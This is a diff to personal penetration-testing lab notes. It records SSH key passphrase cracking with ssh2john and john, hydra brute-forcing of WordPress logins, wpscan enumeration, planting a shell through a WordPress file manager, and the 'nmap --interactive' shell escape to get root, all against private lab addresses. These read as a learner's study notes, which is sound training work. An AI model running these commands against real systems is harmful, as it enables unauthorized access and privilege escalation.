@@ -85,8 +85,16 @@ ssh2john id_rsa file.txt :  to retrive the passphrase
 john --wordlist=/usr/share/wordlists/rockyou.txt file.txt : return the passphrase
 ssh -i id_rsa kay@10.0.4.22
 ```
-S00 interesting article in SMB enumeration:https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
-
+S00 interesting article in SMB enumeration: [samba enumeration tool](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
+#### Basic-pentest-2
+what I had learn from this machine is:
+```
+wordpress authentication: I can brute force the username first then the password with hydra, 
+the uniq thing that can be changed is error message contained in hydra syntax. : minimize the complexity
+./wpscan -u http://10.0.4.23 --enumerate u/tt/..
+install file manager in wordpress if you have admin access (it will contain the shell)
+nmap --interactive => !sh : root access.
+```
 
 
 
